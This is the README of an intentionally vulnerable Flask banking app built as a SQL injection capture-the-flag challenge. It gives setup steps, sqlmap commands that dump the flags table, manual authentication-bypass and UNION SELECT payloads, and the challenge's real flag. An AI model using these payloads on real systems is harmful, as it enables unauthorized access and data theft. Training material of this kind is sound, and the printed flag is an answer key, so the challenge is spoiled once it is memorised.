# 🏦 Razz Bank SQL Injection Challenge

⚠️ **Educational Purpose Only**  
This application is intentionally vulnerable and is designed for **learning and Capture The Flag (CTF) challenges**.  
It contains multiple **decoy flags** and one **real flag**, teaching learners how to distinguish real vulnerabilities from fake leads.  

---

## 🎯 Challenge Overview

- **Challenge Type:** Union-based SQL Injection (SQLi)  
- **Difficulty Level:** Medium  
- **Primary Target:** Extract the **hidden flag** from the database  
- **Scenario:** A vulnerable online banking application with a SQL injection flaw in the login form  

The challenge aims to simulate a **real-world penetration testing workflow** in a safe environment.

---

## 🏴 Flag Format

- **Correct Flag:**  
  ```
  RAZZ{y0U_H@v3_f()UNd_$QL_!NJ3CT10N}
  ```

- **Fake Flags:** Multiple **decoy flags** are hidden in files and pages such as `/robots.txt`, `/sitemap.xml`, source code comments, cookies, and backups.  

---

## 🚀 Quick Setup on Kali Linux

You can set up the challenge using **Docker (recommended)**, manually with **Python + Flask**, or with a **quick run script**.

---

### **Method 1: Using Docker (Recommended)**

```bash
# Clone or download the project files
git clone git@github.com:KerberoSec/RAZZ_BANK.git
cd razz-bank-sqli-challenge

# Build the Docker image
sudo docker build -t razz_bank_challenge .

# Run the container
sudo docker run -p 5000:5000 razz_bank_challenge

# Verify if the container is running
sudo docker ps

# Access the application
http://localhost:5000
```

---

### **Method 2: Manual Setup**

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install Python 3.11 and pip if not already installed
sudo apt install python3.11 python3.11-venv python3-pip -y

# Setup project directory
cd /home/kali/Desktop
mkdir razz-bank-challenge
cd razz-bank-challenge

# Copy project files (app.py, templates/, requirements.txt, etc.)

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt

# Make setup script executable
chmod +x setup.sh
./setup.sh

# Run the application
python3 app.py
```

---

### **Method 3: Quick Run Script**

```bash
# Make the script executable
chmod +x run.sh

# Run the challenge
./run.sh
```

---

## 📁 Project Structure

```
razz-bank-sqli-challenge/
├── app.py                  # Main Flask application
├── requirements.txt        # Python dependencies
├── Dockerfile              # Docker build configuration
├── setup.sh                # Setup script
├── run.sh                  # Quick run script
├── README.md               # Documentation (this file)
├── templates/
│   ├── base.html           # Base HTML layout
│   ├── index.html          # Homepage
│   ├── login.html          # Login page (VULNERABLE)
│   ├── register.html       # Registration page
│   └── dashboard.html      # User dashboard
└── razz_bank.db            # SQLite database (auto-generated)
```

---

## 🔍 Challenge Details

### **Database Schema**
- `users` table → 87 regular users + 1 admin  
- `system_flags` table → Contains the **real flag**  
- `transactions` table → Sample banking transactions  

---

### **Vulnerability Location**
- The SQL injection exists in the **login form** at:
  ```
  POST /login
  ```

---

### **Fake Flag Locations**
- `/robots.txt` → `RAZZ{y0U#H@v3$f()<]UNd^F@K3|FL4G}`
- `/sitemap.xml` → `RAZZ{y0U_H@v3^f(){UNd}/F@K3~FL4G}`
- HTML comments in page source
- `/admin` cookie
- `/backup` hidden page

---

### **SQLi Parameters**
- **6 fake vulnerable parameters** that return misleading data  
- **1 real vulnerable parameter** that leads to `system_flags`  

---

## 🛠️ Exploiting with SQLMap

### **Basic Commands**

```bash
# Install sqlmap (if missing)
sudo apt install sqlmap -y

# Test for SQL injection
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=admin" --dbs

# Enumerate databases
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=admin" --current-db

# Enumerate tables
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=admin" -D razz_bank --tables

# Dump system_flags
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=admin" -D razz_bank -T system_flags --dump
```

---

### **Manual Exploitation**

```sql
-- Authentication Bypass
Username: admin' OR '1'='1' --
Password: anything

-- Union-based SQLi to extract the flag
Username: admin' UNION SELECT 1,2,3,flag_value,5,6,7,8 FROM system_flags--
Password: anything
```

---

## 🔐 Challenge Walkthrough

1. **Recon**
   - Visit `http://localhost:5000`  
   - Inspect `/robots.txt`, `/sitemap.xml`, page source  
   - Look for fake flags  

2. **Identify Injection Point**
   - Login page (`/login`)  
   - Test payloads like `' OR '1'='1`  

3. **Exploit**
   - Use `UNION SELECT` to dump from `system_flags`  
   - Extract **real flag**:  
     ```
     RAZZ{y0U_H@v3_f()UNd_$QL_!NJ3CT10N}
     ```

---

## 🎯 Learning Objectives

- Learn to **detect SQL injection vulnerabilities**  
- Understand **UNION-based SQLi attacks**  
- Practice **data exfiltration with SQLMap**  
- Distinguish **real vs. decoy flags**  
- Gain experience with **secure coding practices**  

---

## 🛡️ Security Lessons

❌ **Vulnerable Code Example**  
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(query)
```

✅ **Secure Code Example (Parameterized Queries)**  
```python
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))
```

---

## 📊 Database Statistics

- **Total Users:** 88 (87 regular + 1 admin)  
- **Transactions:** Multiple demo records  
- **Flags:** 1 real + 5 fake  

---

## 🐛 Troubleshooting

- **Port Already in Use**
  ```bash
  sudo lsof -t -i:5000 | xargs kill -9
  ```

- **Permission Denied**
  ```bash
  chmod +x setup.sh run.sh
  ```

- **Database Issues**
  ```bash
  rm razz_bank.db
  python3 -c "from app import init_db; init_db()"
  ```

- **Docker Issues**
  ```bash
  docker stop razz_bank
  docker rm razz_bank
  docker rmi razz_bank_challenge
  ```

---

## 🔄 Resetting the Challenge

```bash
# Stop the application
# Delete the database
rm razz_bank.db

# Restart (database will regenerate automatically)
python3 app.py
```

---

## 📝 Hints for Exploitation

- Start with **basic payloads**  
- Use **SQL comments** (`--` or `/* */`)  
- Use `UNION SELECT` for enumeration  
- Focus on **system_flags table**  
- Real flag format is always:
  ```
  RAZZ{...}
  ```

---

## ⚠️ Important Notes

- This application is **intentionally vulnerable**  
- Never deploy in **production**  
- For **educational & authorized testing only**  
- Includes **decoy flags** to mimic real-world CTFs  
- Fully exploitable with **SQLMap** or manually  

---

## 🏆 Challenge Completion

✅ You win when you extract:  
```
RAZZ{y0U_H@v3_f()UNd_$QL_!NJ3CT10N}
```

---

## 📞 Support

- Check **Troubleshooting** section above  
- Ensure **Docker** and **Python 3.11** are installed  
- Verify port **5000** availability  

---

## 📚 Additional Resources

- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)  
- [SQLMap Documentation](http://sqlmap.org/)  
- [Flask Security Best Practices](https://flask.palletsprojects.com/)  

---

### Created for **Razz Security CTF Challenge**  
🎓 For **educational purposes only** – use responsibly.  

---

✅ **Working Docker commands that I tested successfully:**  
```bash
sudo docker build -t razz_bank_challenge .
sudo docker run -p 5000:5000 razz_bank_challenge
```
